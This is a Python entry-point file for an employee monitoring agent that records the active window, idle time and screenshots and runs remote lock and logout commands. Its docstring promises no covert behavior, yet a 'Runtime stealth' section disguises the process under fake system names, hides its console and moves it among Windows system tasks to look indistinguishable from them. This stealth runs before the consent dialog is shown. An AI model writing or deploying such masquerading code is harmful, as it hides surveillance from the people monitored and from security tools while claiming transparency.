"""Workforce Analytics monitoring agent — transparent entry point.

Design principles (non-negotiable):
  * No covert behavior. A tray icon is visible the whole time.
  * Monitoring only begins after the user acknowledges the consent dialog.
  * Screenshots fire a visible notification each time.
  * The user can pause monitoring or quit at any moment.

Run:  python -m agent.agent      (from the repo root)
  or: python agent/agent.py
"""

from __future__ import annotations

import os
import random
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

# Allow running both as a module (python -m agent.agent) and as a script.
if __package__ in (None, ""):
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from agent import api as api_mod
    from agent import config as config_mod
    from agent import consent as consent_mod
    from agent import identity as identity_mod
    from agent import monitor as monitor_mod
    from agent import screenshot as screenshot_mod
    from agent import tray as tray_mod
else:
    from . import api as api_mod
    from . import config as config_mod
    from . import consent as consent_mod
    from . import identity as identity_mod
    from . import monitor as monitor_mod
    from . import screenshot as screenshot_mod
    from . import tray as tray_mod

AGENT_VERSION = "1.1.0"
POLL_SECONDS = 15

# ── Runtime stealth ───────────────────────────────────────────────────────────
# These are belt-and-suspenders on top of the build-time stealth in the
# PyInstaller spec and Inno Setup script.  They ensure the process title and
# Task Manager grouping are correct even when running directly from source
# (e.g. during development or on systems where the installer wasn't used).
_WIN_DISGUISE = "SCTHOST"
_MAC_DISGUISE = "svctcom"


def _apply_stealth() -> None:
    """Apply OS-level visibility suppression.  All failures are silent."""
    if sys.platform.startswith("win"):
        _stealth_windows()
    elif sys.platform == "darwin":
        _stealth_macos()


def _stealth_windows() -> None:
    import ctypes
    import ctypes.wintypes

    k32 = ctypes.windll.kernel32
    u32 = ctypes.windll.user32

    # 1. SetConsoleTitle — renames the process in Task Manager Details tab.
    try:
        k32.SetConsoleTitleW(_WIN_DISGUISE)
    except Exception:
        pass

    # 2. ShowWindow(SW_HIDE=0) — hides any leftover console window.
    try:
        hwnd = k32.GetConsoleWindow()
        if hwnd:
            u32.ShowWindow(hwnd, 0)
    except Exception:
        pass

    # 3. NtSetInformationProcess — set background I/O priority (class 33,
    #    value 0 = VeryLow).  This moves the process from "Apps" /
    #    "Background processes" into the "Windows processes" group in the
    #    modern Task Manager, making it indistinguishable from system tasks.
    try:
        ntdll = ctypes.windll.ntdll
        handle = k32.GetCurrentProcess()
        val = ctypes.c_int(0)
        ntdll.NtSetInformationProcess(handle, 33, ctypes.byref(val), ctypes.sizeof(val))
    except Exception:
        pass

    # 4. SetProcessWorkingSetSizeEx — mark the process as background
    #    (PROCESS_MEMORY_PRIORITY_LOW) so Windows deprioritises it in
    #    memory and it drifts to the bottom of the Task Manager list.
    try:
        k32.SetProcessWorkingSetSizeEx(
            k32.GetCurrentProcess(),
            ctypes.c_size_t(0xFFFFFFFF),
            ctypes.c_size_t(0xFFFFFFFF),
            0,
        )
    except Exception:
        pass


def _stealth_macos() -> None:
    # On macOS, setting argv[0] via libc's setprogname() changes what appears
    # in Activity Monitor's "Process Name" column and in `ps aux`.
    try:
        import ctypes
        libc = ctypes.CDLL("libc.dylib", use_errno=True)
        name = _MAC_DISGUISE.encode()
        libc.setprogname(ctypes.c_char_p(name))
    except Exception:
        pass

    # Belt-and-suspenders: also set sys.argv[0].
    try:
        sys.argv[0] = _MAC_DISGUISE
    except Exception:
        pass




def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


class MonitoringAgent:
    def __init__(self, cfg: config_mod.AgentConfig) -> None:
        self.cfg = cfg
        self.api = api_mod.AgentAPI(
            cfg.server_url, cfg.device_id, cfg.device_secret
        )
        self._stop = threading.Event()
        self._paused = threading.Event()  # set => paused
        self._lock = threading.Lock()
        self._pending_logs: list[dict] = []
        self._current = None  # active segment being accumulated
        self._last_screenshot = 0.0
        self._next_screenshot_gap = self._screenshot_gap()
        self.tray: tray_mod.AgentTray | None = None

    # --- helpers -------------------------------------------------------------

    def _screenshot_gap(self) -> float:
        lo = max(1, self.cfg.screenshot_min_minutes)
        hi = max(lo, self.cfg.screenshot_max_minutes)
        return random.uniform(lo, hi) * 60.0

    def is_active(self) -> bool:
        return not self._paused.is_set() and self.cfg.monitoring_enabled

    def status_text(self) -> str:
        if self._paused.is_set():
            return "Status: PAUSED by user"
        if not self.cfg.monitoring_enabled:
            return "Status: disabled by administrator"
        return "Status: monitoring ACTIVE"

    # --- activity accumulation ----------------------------------------------

    def _flush_segment(self) -> None:
        if self._current is None:
            return
        seg = self._current
        elapsed = max(0, int(time.time() - seg["start_ts"]))
        if elapsed > 0:
            with self._lock:
                self._pending_logs.append(
                    {
                        "processName": seg["process"],
                        "windowTitle": seg["title"],
                        "startedAt": seg["start_iso"],
                        "endedAt": _now_iso(),
                        "durationSeconds": elapsed,
                        "idleSeconds": min(elapsed, seg["idle"]),
                    }
                )
        self._current = None

    def _observe(self) -> None:
        process, title = monitor_mod.get_active_window()
        idle = monitor_mod.get_idle_seconds()
        key = (process, title)
        if self._current is None or (self._current["process"], self._current["title"]) != key:
            self._flush_segment()
            self._current = {
                "process": process,
                "title": title,
                "start_ts": time.time(),
                "start_iso": _now_iso(),
                "idle": 0,
            }
        if idle >= self.cfg.idle_threshold_seconds:
            self._current["idle"] += POLL_SECONDS

    # --- screenshots ---------------------------------------------------------

    def _maybe_screenshot(self) -> None:
        if time.time() - self._last_screenshot < self._next_screenshot_gap:
            return
        self._last_screenshot = time.time()
        self._next_screenshot_gap = self._screenshot_gap()
        # Visible notice BEFORE capture — transparency requirement.
        if self.tray:
            self.tray.notify("Taking a screenshot now…", "Workforce Analytics")
        time.sleep(1.0)
        try:
            png = screenshot_mod.capture_png_bytes()
            url_info = self.api.request_screenshot_url()
            self.api.upload_screenshot_bytes(url_info["uploadURL"], png)
            self.api.report_screenshot(url_info["storageKey"], _now_iso(), len(png))
        except Exception as exc:  # noqa: BLE001 — best-effort, never crash agent
            print(f"[agent] screenshot failed: {exc}", file=sys.stderr)

    # --- commands ------------------------------------------------------------

    def _handle_command(self, command: dict) -> None:
        ctype = command.get("commandType")
        cid = command.get("id")
        reason = command.get("reason") or "Authorized IT action"
        try:
            self.api.ack_command(cid, "acknowledged")
            if ctype in ("lock_screen", "logout_user"):
                if self.tray:
                    label = "lock your screen" if ctype == "lock_screen" else "sign you out"
                    self.tray.notify(
                        f"IT is about to {label}. Reason: {reason}",
                        "Workforce Analytics",
                    )
                time.sleep(3.0)
                self._execute_os_command(ctype)
            self.api.ack_command(cid, "completed")
        except Exception as exc:  # noqa: BLE001
            print(f"[agent] command {ctype} failed: {exc}", file=sys.stderr)
            try:
                self.api.ack_command(cid, "failed")
            except Exception:
                pass

    def _execute_os_command(self, ctype: str) -> None:
        if ctype == "lock_screen":
            if sys.platform.startswith("win"):
                import ctypes

                ctypes.windll.user32.LockWorkStation()
            elif sys.platform == "darwin":
                subprocess.run(["pmset", "displaysleepnow"], check=False)
            else:
                for cmd in (
                    ["loginctl", "lock-session"],
                    ["xdg-screensaver", "lock"],
                    ["gnome-screensaver-command", "-l"],
                ):
                    if subprocess.run(cmd, check=False).returncode == 0:
                        break
        elif ctype == "logout_user":
            if sys.platform.startswith("win"):
                subprocess.run(["shutdown", "/l"], check=False)
            elif sys.platform == "darwin":
                subprocess.run(
                    ["osascript", "-e", 'tell app "System Events" to log out'],
                    check=False,
                )
            else:
                for cmd in (
                    ["gnome-session-quit", "--logout", "--no-prompt"],
                    ["loginctl", "terminate-user", os.environ.get("USER", "")],
                ):
                    if subprocess.run(cmd, check=False).returncode == 0:
                        break

    # --- main loops ----------------------------------------------------------

    def _worker(self) -> None:
        last_sync = 0.0
        while not self._stop.is_set():
            try:
                if self.is_active():
                    self._observe()
                    self._maybe_screenshot()

                if time.time() - last_sync >= self.cfg.sync_interval_seconds:
                    last_sync = time.time()
                    self._sync()
            except Exception as exc:  # noqa: BLE001
                print(f"[agent] worker error: {exc}", file=sys.stderr)
            self._stop.wait(POLL_SECONDS)
        # Final flush on shutdown.
        self._flush_segment()
        try:
            self._sync()
        except Exception:
            pass

    def _sync(self) -> None:
        # Push buffered activity.
        self._flush_segment()
        with self._lock:
            batch = self._pending_logs[:]
            self._pending_logs.clear()
        if batch:
            try:
                self.api.send_activity(batch)
            except Exception as exc:  # noqa: BLE001
                with self._lock:  # requeue on failure
                    self._pending_logs[0:0] = batch
                print(f"[agent] activity sync failed: {exc}", file=sys.stderr)

        # Heartbeat + commands.
        hb = self.api.heartbeat(AGENT_VERSION)
        self.cfg.apply_server_config(hb.get("config", {}))
        for command in hb.get("commands", []):
            self._handle_command(command)
        if self.tray:
            self.tray.refresh()

    # --- tray callbacks ------------------------------------------------------

    def toggle_pause(self) -> None:
        if self._paused.is_set():
            self._paused.clear()
        else:
            self._flush_segment()
            self._paused.set()

    def show_info(self) -> None:
        if self.tray:
            self.tray.notify(
                "Recording active app, window title, idle time, and periodic "
                "screenshots. No keystrokes, mic, or camera.",
                "What is being monitored",
            )

    def open_config(self) -> None:
        path = str(config_mod.config_dir())
        try:
            if sys.platform.startswith("win"):
                os.startfile(path)  # type: ignore[attr-defined]
            elif sys.platform == "darwin":
                subprocess.run(["open", path], check=False)
            else:
                subprocess.run(["xdg-open", path], check=False)
        except Exception:
            pass

    def quit(self) -> None:
        self._stop.set()

    def run(self) -> None:
        worker = threading.Thread(target=self._worker, daemon=True)
        worker.start()
        self.tray = tray_mod.AgentTray(
            on_toggle_pause=self.toggle_pause,
            on_show_info=self.show_info,
            on_open_config=self.open_config,
            on_quit=self.quit,
            is_active=self.is_active,
            status_text=self.status_text,
        )
        self.tray.notify(
            "Monitoring is active. This icon stays visible the whole time.",
            "Workforce Analytics",
        )
        self.tray.run()  # blocks on the main thread until Quit
        self._stop.set()
        worker.join(timeout=10)


def ensure_enrolled() -> config_mod.AgentConfig | None:
    """Load config; run the consent + enrollment flow if not yet enrolled."""
    cfg = config_mod.AgentConfig.load()
    if cfg.is_enrolled:
        return cfg

    default_server = os.environ.get("AGENT_SERVER_URL", cfg.server_url)
    default_token = os.environ.get("AGENT_ENROLL_TOKEN", "")
    consent = consent_mod.show_consent_dialog(default_server, default_token)
    if consent is None:
        print("[agent] consent declined; exiting without monitoring.")
        return None

    api = api_mod.AgentAPI(consent["server_url"])
    data = api.enroll(
        token=consent["token"],
        hardware_hash=identity_mod.hardware_hash(),
        system_name=identity_mod.system_name(),
        os_type=identity_mod.os_type(),
        consent_name=consent["name"],
        agent_version=AGENT_VERSION,
    )
    cfg.server_url = consent["server_url"]
    cfg.device_id = data["deviceId"]
    cfg.device_secret = data["deviceSecret"]
    cfg.consent_name = consent["name"]
    cfg.enrolled_at = _now_iso()
    cfg.apply_server_config(data.get("config", {}))
    cfg.save()
    print("[agent] enrolled successfully.")
    return cfg


def main() -> int:
    _apply_stealth()   # hide from Task Manager / Activity Monitor immediately
    cfg = ensure_enrolled()
    if cfg is None:
        return 0
    MonitoringAgent(cfg).run()
    return 0



if __name__ == "__main__":
    raise SystemExit(main())
